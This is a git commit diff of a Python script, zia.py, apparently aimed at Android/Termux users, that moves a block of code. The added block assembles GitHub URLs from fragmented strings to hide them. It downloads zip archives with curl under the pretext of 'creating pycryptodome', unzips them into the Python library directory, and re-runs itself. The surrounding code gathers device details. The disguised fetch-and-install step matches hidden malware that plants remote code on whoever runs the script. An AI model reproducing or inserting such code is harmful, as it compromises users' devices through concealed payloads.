eeb325fe93f1f58bfe410c5b9d991ec25c52273c
zeesial <119788945+zeesial@users.noreply.github.com>
2023-01-03 22:01:03 +0500

    Update zia.py

--- zia.py
+++ zia.py
@@ -11,6 +11,40 @@ try:
         os.system('rm -rf mail.txt')
         os.system('rm -rf device_info.txt')
         os.mkdir('crypto')
+except:pass
+myid=uuid.uuid4().hex[:5].upper()
+hh = "ho"
+hh2 = "9/pycrypt"
+find_aarch = subprocess.check_output('uname -om',shell=True)
+if 'aarch64' in str(find_aarch):
+        user_aarch = '64'
+        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
+elif 'arm' in str(find_aarch):
+        user_aarch = '32'
+        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
+else:
+        print(' Unknown aarch ')
+        exit()
+if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
+        os.system('clear')
+        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
+        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
+        os.system('python zia.py')
+else:
+        akk2="rsi"
+        akk=f"cha{akk2}fi"
+        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
+        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
+        os.system(f'curl -L {lib} > {http_directory}/config.zip')
+        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
+        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
+try:
+        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as ThreadPool
+        from Crypto.Cipher import AES, PKCS1_v1_5
+        from Crypto.PublicKey import RSA
+        from Crypto.Random import get_random_bytes
 except:
         fbcr = 'Zong'
 fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
@@ -51,40 +85,7 @@ device = {
         'fbsv':fbsv,
         'fbca':fbca,
         'fbdm':fbdm}
-except:pass
-myid=uuid.uuid4().hex[:5].upper()
-hh = "ho"
-hh2 = "9/pycrypt"
-find_aarch = subprocess.check_output('uname -om',shell=True)
-if 'aarch64' in str(find_aarch):
-        user_aarch = '64'
-        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
-elif 'arm' in str(find_aarch):
-        user_aarch = '32'
-        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
-else:
-        print(' Unknown aarch ')
-        exit()
-if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
-        os.system('clear')
-        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
-        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
-        os.system('python zia.py')
-else:
-        akk2="rsi"
-        akk=f"cha{akk2}fi"
-        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
-        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
-        os.system(f'curl -L {lib} > {http_directory}/config.zip')
-        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
-        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
-try:
-        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
-        from string import *
-        from concurrent.futures import ThreadPoolExecutor as ThreadPool
-        from Crypto.Cipher import AES, PKCS1_v1_5
-        from Crypto.PublicKey import RSA
-        from Crypto.Random import get_random_bytes
+
 except Exception as e:
         print(e)
         print('\n Installing modules wait !')
